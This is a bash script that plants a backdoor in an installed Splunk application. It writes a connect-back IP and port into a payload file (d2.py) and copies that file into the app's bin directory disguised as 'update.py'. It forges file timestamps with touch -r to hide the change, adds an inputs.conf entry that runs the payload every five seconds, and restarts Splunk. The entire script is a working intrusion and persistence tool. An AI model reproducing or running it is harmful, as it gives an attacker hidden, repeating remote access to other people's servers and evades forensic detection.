#!/bin/bash

SCRIPT="./d2.py"
INPUTS="inputs.conf"

echo "[#] script to backdoor an installed splunk application"
read -e -p "[+] connect back IP: " CBACKIP 
read -e -p "[+] connect back PORT: " CBACKPORT
read -e -p "[+] installed application pathname to patch: " -i "/opt/splunk/etc/apps/search" PATH
read -e -p "[+] splunk binary pathname: " -i "/opt/splunk/bin/splunk" SPLUNK
read -e -p "[+] script name to copy: " -i "update.py" BDOOR

echo "[#] update the malicious payload d2.py with yours values"
/bin/sed -i "s/^CBACKIP=.*/CBACKIP='$CBACKIP'/" $SCRIPT
/bin/sed -i "s/^CBACKPORT=.*/CBACKPORT=$CBACKPORT/" $SCRIPT

echo "[#] fix scritps and binaries mactimes"
/usr/bin/touch -r "$PATH/bin" $SCRIPT
USER=`/usr/bin/stat -c '%U' $PATH`
GROUP=`/usr/bin/stat -c '%G' $PATH`
/bin/chown $USER:$GROUP $SCRIPT
/bin/cp -p $SCRIPT "$PATH/bin/$BDOOR"
/bin/chmod 555 "$PATH/bin/$BDOOR"
/usr/bin/touch -r $SCRIPT "$PATH/bin"

echo "[#] patch or create Splunk application inputs.conf file"
if [ -e "$PATH/local/$INPUTS" ];
then
  /bin/cp -p "$PATH/local/$INPUTS" $INPUTS
  /usr/bin/touch -r "$PATH/local/$INPUTS" $INPUTS
else
  /usr/bin/touch $INPUTS
  /usr/bin/touch -r "$PATH/default" $INPUTS
fi
echo >> $INPUTS
echo "[script://./bin/$BDOOR]" >> $INPUTS
echo "disabled = false" >> $INPUTS
echo "interval = 5" >> $INPUTS
echo "index = default" >> $INPUTS
/bin/cp -p $INPUTS "$PATH/local/$INPUTS"
/usr/bin/touch -r $INPUTS "$PATH/local/$INPUTS"

echo "[#] restart Splunk"
$SPLUNK restart
